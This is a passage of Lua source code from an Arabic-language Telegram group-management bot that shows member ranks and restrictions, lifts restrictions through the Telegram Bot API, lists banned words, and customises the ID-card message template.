if tonumber(res.id_) == tonumber(1419573259) then
t = 'مبرمج السورس'
elseif tonumber(res.id_) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(res.id_) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevFeras:sismember(DevFeras..'abs:SudoBot:',res.id_) then
t = DevFeras:get(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevFeras:sismember(DevFeras..'abs:absmonsh:'..msg.chat_id_,res.id_) then
t = 'منشئ المجموعه'
elseif DevFeras:sismember(DevFeras..'abs:monsh:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevFeras:sismember(DevFeras..'abs:monshid:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevFeras:sismember(DevFeras..'abs:owners:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevFeras:sismember(DevFeras..'abs:admins:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevFeras:sismember(DevFeras..'abs:vipall:',res.id_) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevFeras:sismember(DevFeras..'abs:ownerall:',res.id_) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'نائب مدير'
elseif DevFeras:sismember(DevFeras..'abs:adminall:',res.id_) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevFeras:sismember(DevFeras..'abs:vipmem:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز'
elseif DevFeras:sismember(DevFeras..'abs:Cleaner:'..msg.chat_id_,res.id_) then
t = DevFeras:get(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_) or 'منظف'
else
t = DevFeras:get(DevFeras.."abs:mem:Rd"..msg.chat_id_) or 'عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..res.id_) or 0)
if DevFeras:sismember(DevFeras..'abs:BanAll:',res.id_) then
Tkeed = 'محظور عام'
elseif DevFeras:sismember(DevFeras..'abs:MuteAll:',res.id_) then
Tkeed = 'مكتوم عام'
elseif DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'محظور'
elseif DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'مكتوم'
elseif DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if DevFeras:sismember(DevFeras..'abs:SudoBot:',res.id_) then
sudobot = '\n⌁︙عدد القروبات ↫ '..(DevFeras:get(DevFeras..'abs:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if data.first_name_ == false then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..res.id_..'` ❩\n⌁︙رتبته ↫ '..t..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('كشف (%d+)') and ChCheck(msg) or text and text:match('ايدي (%d+)') and ChCheck(msg) then 
local iduser = text:match('كشف (%d+)') or text:match('ايدي (%d+)')  
if tonumber(iduser) == tonumber(1419573259) then
t = 'مبرمج السورس'
elseif tonumber(iduser) == tonumber(bot_id) then
t = 'هذا البوت'
elseif tonumber(iduser) == tonumber(DevId) then
t = 'مطور اساسي'
elseif DevFeras:sismember(DevFeras..'abs:SudoBot:',iduser) then
t = DevFeras:get(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت'
elseif DevFeras:sismember(DevFeras..'abs:absmonsh:'..msg.chat_id_,iduser) then
t = 'منشئ المجموعه'
elseif DevFeras:sismember(DevFeras..'abs:monsh:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:monsh:Rd"..msg.chat_id_) or 'منشئ اساسي'
elseif DevFeras:sismember(DevFeras..'abs:monshid:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:monshid:Rd"..msg.chat_id_) or 'منشئ'
elseif DevFeras:sismember(DevFeras..'abs:owners:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'مدير'
elseif DevFeras:sismember(DevFeras..'abs:admins:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن'
elseif DevFeras:sismember(DevFeras..'abs:vipall:',iduser) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز عام'
elseif DevFeras:sismember(DevFeras..'abs:ownerall:',iduser) then
t = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'نائب مدير'
elseif DevFeras:sismember(DevFeras..'abs:adminall:',iduser) then
t = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'ادمن عام'
elseif DevFeras:sismember(DevFeras..'abs:vipmem:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'مميز'
elseif DevFeras:sismember(DevFeras..'abs:Cleaner:'..msg.chat_id_,iduser) then
t = DevFeras:get(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_) or 'منظف'
else
t = DevFeras:get(DevFeras.."abs:mem:Rd"..msg.chat_id_) or 'عضو'
end
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙لم يتم التعرف على الحساب', 1, 'md')
return false  end
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..iduser) or 0)
if DevFeras:sismember(DevFeras..'abs:BanAll:',iduser) then
Tkeed = 'محظور عام'
elseif DevFeras:sismember(DevFeras..'abs:MuteAll:',iduser) then
Tkeed = 'مكتوم عام'
elseif DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'محظور'
elseif DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'مكتوم'
elseif DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'مقيد'
else
Tkeed = 'لا يوجد'
end
if DevFeras:sismember(DevFeras..'abs:SudoBot:',iduser) then
sudobot = '\n⌁︙عدد القروبات ↫ '..(DevFeras:get(DevFeras..'abs:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if data.first_name_ == false then
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙الحساب محذوف', 1, 'md')
return false  end
if data.username_ == false then
Text = '⌁︙اسمه ↫ ['..CatchName(data.first_name_,20)..'](tg://user?id='..iduser..')\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..t..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1,'⌁︙معرفه ↫ [@'..data.username_..']\n⌁︙ايديه ↫ ❨ `'..iduser..'` ❩\n⌁︙رتبته ↫ '..t..''..sudobot..'\n⌁︙رسائله ↫ ❨ '..user_msgs..' ❩\n⌁︙تفاعله ↫ '..formsgs(user_msgs)..'\n⌁︙نقاطه ↫ ❨ '..user_nkt..' ❩\n⌁︙القيود ↫ '..Tkeed, 1, 'md')
end
end,nil)
return false 
end 
--     Source DevFeras     --
if text == 'كشف القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevFeras:sismember(DevFeras..'abs:BanAll:',result.sender_user_id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevFeras:sismember(DevFeras..'abs:MuteAll:',result.sender_user_id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevFeras:sismember(DevFeras..'abs:Tkeed:',result.sender_user_id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقييد ↫ '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^كشف القيود @(.*)') and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local username = text:match('^كشف القيود @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,result.id_) then muted = 'مكتوم' else muted = 'غير مكتوم' end
if DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,result.id_) then banned = 'محظور' else banned = 'غير محظور' end
if DevFeras:sismember(DevFeras..'abs:BanAll:',result.id_) then banall = 'محظور عام' else banall = 'غير محظور عام' end
if DevFeras:sismember(DevFeras..'abs:MuteAll:',result.id_) then muteall = 'مكتوم عام' else muteall = 'غير مكتوم عام' end
if DevFeras:sismember(DevFeras..'abs:Tkeed:',result.id_) then tkeed = 'مقيد' else tkeed = 'غير مقيد' end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الحظر العام ↫ '..banall..'\n⌁︙الكتم العام ↫ '..muteall..'\n⌁︙الحظر ↫ '..banned..'\n⌁︙الكتم ↫ '..muted..'\n⌁︙التقييد ↫ '..tkeed..'', 1, 'md')  
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'رفع القيود' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.sender_user_id_
},function(arg,data) 
if DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) or DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,result.sender_user_id_) or DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,result.sender_user_id_) then
if data.username_ == false then 
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..result.sender_user_id_..') \n⌁︙تم رفع قيوده بنجاح \n ✓'
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_,result.sender_user_id_)   
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_,result.sender_user_id_)   
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.sender_user_id_) 
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_,result.sender_user_id_)   
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
else
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..result.sender_user_id_..') \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end
end,nil)   
end 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^رفع القيود (%d+)') and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then 
local user = text:match('رفع القيود (%d+)') 
if tonumber(user) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = user
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لم استطع استخراج المعلومات* \n', 1, 'md') 
return false  end
if DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,user) or DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,user) or DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,user) then
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..user..') \n⌁︙تم رفع قيوده بنجاح \n ✓'
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_,user) 
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_,user)   
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_,user)   
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_,user) 
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_,user)   
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_,user)   
end
else
if data.username_ == false then
Text = '⌁︙العضو ↫ ['..CatchName(data.first_name_,15)..'](tg://user?id='..user..') \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end
end,nil)  
end
if text and text:match('^رفع القيود @(.*)') and Admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local username = text:match('رفع القيود @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')  
return false  end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*هذا معرف قناة وليس معرف حساب* \n', 1, 'md') 
return false  end
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*انا البوت وليس لدي قيود* \n', 1, 'md')  
return false  end 
tdcli_function ({
ID = "GetUser",
user_id_ = result.id_
},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙*لم استطع استخراج المعلومات* \n', 1, 'md') 
return false  end
if DevFeras:sismember(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.id_) or DevFeras:sismember(DevFeras..'abs:Muted:'..msg.chat_id_,result.id_) or DevFeras:sismember(DevFeras..'abs:Ban:'..msg.chat_id_,result.id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙تم رفع قيوده بنجاح \n ✓'  , 1, 'md') 
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
DevFeras:srem(DevFeras..'abs:Tkeed:'..msg.chat_id_,result.id_) 
DevFeras:srem(DevFeras..'abs:Ban:'..msg.chat_id_,result.id_)   
DevFeras:srem(DevFeras..'abs:Muted:'..msg.chat_id_,result.id_)   
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙العضو ↫ [@'..data.username_..'] \n⌁︙ليس لديه قيود ليتم رفعها \n ✓'  , 1, 'md') 
end
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قائمه المنع$") and ChCheck(msg) then
local abs = (DevFeras..'bot:filters:'..msg.chat_id_)
local list = DevFeras:hkeys(abs)
text = "⌁︙قائمة المنع ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k, v in pairs(list) do
text = text..k..'~ ❨ '..v..' ❩\n'
end
if #list == 0 then
text = "⌁︙لا توجد كلمات ممنوعه"
end
Dev_Feras(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end end
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تغيير الايدي$") and ChCheck(msg) or text and text:match("^تغير الايدي$") and ChCheck(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠𝙼𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂️ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈𝐃 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 : #stast 
𓄼🇮🇶 𝒊𝒅 : #id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 : #game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 : #msgs
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: 𝒖𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
⌁︙𝐔𝐒𝐄𝐑 ↬ #username 
⌁︙𝐈𝐃 ↬ #id
⌁︙𝐒𝐓𝐀𝐒𝐓 ↬ #stast
⌁︙𝐀𝐔𝐓𝐎 ↬ #cont 
⌁︙𝐌𝐀𝐒𝐆 ↬ #msgs
⌁︙𝐆𝐀𝐌𝐄 ↬ #game
]],
[[
ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇺🇸 ꙰
ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇺🇸 ꙰
ᯓ 𝗜𝗗 . #id 🇺🇸 ꙰
ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇺🇸 ꙰
ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇺🇸 ꙰
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
- ᴍѕɢѕ ➥• #msgs .
- ѕᴛᴀᴛѕ ➥• #stast .
- ʏᴏᴜʀ ɪᴅ ➥• #id  .
- ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
- ᴅᴇᴛᴀɪʟs ➥• #auto . 
- ɢᴀᴍᴇ ➥• #game .
]]}
local Text_Rand = List[math.random(#List)]
DevFeras:set("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_,Text_Rand)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
--     Source DevFeras     --
if Sudo(msg) then
if text and text:match("^تعيين الايدي العام$") or text and text:match("^تعين الايدي العام$") or text and text:match("^تعيين كليشة الايدي$") then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n #username ↬ لطبع المعرف\n #id ↬ لطبع الايدي \n #photos ↬ لطبع عدد الصور \n #stast ↬ لطبع الرتب \n #msgs ↬ لطبع عدد الرسائل \n #msgday ↬ لطبع الرسائل اليوميه \n #auto ↬ لطبع التفاعل \n #game ↬ لطبع عدد النقاط \n #cont ↬ لطبع عدد الجهات \n #sticker ↬ لطبع عدد الملصقات \n #edit ↬ لطبع عدد التعديلات \n #Description ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevFeras:set("DevFeras:New:id:"..bot_id..msg.sender_user_id_,'Feras_dev')
return "Feras_dev"
end
if text and DevFeras:get("DevFeras:New:id:"..bot_id..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevFeras:del("DevFeras:New:id:"..bot_id..msg.sender_user_id_)
return false
end
DevFeras:del("DevFeras:New:id:"..bot_id..msg.sender_user_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الايدي العامه', 1, 'md')
DevFeras:set("DevFeras:Feras_dev:id:text:"..bot_id,text)
return false
end
if text and text:match("^حذف الايدي العام$") or text and text:match("^مسح الايدي العام$") or text and text:match("^حذف كليشة الايدي$") then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف كليشة الايدي العامه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del("DevFeras:Feras_dev:id:text:"..bot_id)
end
end
--     Source DevFeras     --
if text and text:match("^تعيين الايدي$") and ChCheck(msg) or text and text:match("^تعين الايدي$") and ChCheck(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙رجائا اتبع التعليمات للتعيين \n⌁︙لطبع كليشة الايدي ارسل كليشه تحتوي على النصوص التي باللغه الانجليزيه ادناه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n #username ↬ لطبع المعرف\n #id ↬ لطبع الايدي \n #photos ↬ لطبع عدد الصور \n #stast ↬ لطبع الرتب \n #msgs ↬ لطبع عدد الرسائل \n #msgday ↬ لطبع الرسائل اليوميه \n #auto ↬ لطبع التفاعل \n #game ↬ لطبع عدد النقاط \n #cont ↬ لطبع عدد الجهات \n #sticker ↬ لطبع عدد الملصقات \n #edit ↬ لطبع عدد التعديلات \n #Description ↬ لطبع تعليق الصور\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉', 1, 'md')
DevFeras:set("DevFeras:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'Feras_dev')
return "Feras_dev"
end
if text and Owner(msg.sender_user_id_, msg.chat_id_) and DevFeras:get("DevFeras:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الايدي', 1, 'md')
DevFeras:del("DevFeras:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
return false
end
DevFeras:del("DevFeras:New:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الكليشه الجديده', 1, 'md')
DevFeras:set("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_,text)
return false
end
if text and text:match("^حذف الايدي$") and ChCheck(msg) or text and text:match("^مسح الايدي$") and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف كليشة الايدي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_)
end
end
--     Source DevFeras     --
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if text and (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and ChCheck(msg) then
function Feras_dev(extra,result,success)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
local function getpro(extra, result, success) 
local msgsday = DevFeras:get(DevFeras..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local edit_msg = DevFeras:get(DevFeras..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local sticker = (tonumber(DevFeras:get(DevFeras.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local user_nkt = tonumber(DevFeras:get(DevFeras..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local cont = (tonumber(DevFeras:get(DevFeras..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local msguser = tonumber(DevFeras:get(DevFeras..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local Texting = {"صورتك فدشي 😘😔❤️","مقتنع بصورتك؟ 🤣","ملاك وناسيك بكروبنه 😟","وفالله 😔💘","كشخه برب 😉💘","لازك بيها غيرها عاد 😒","صورتك مامرتاحلها 😐","حلغوم والله ☹️",}
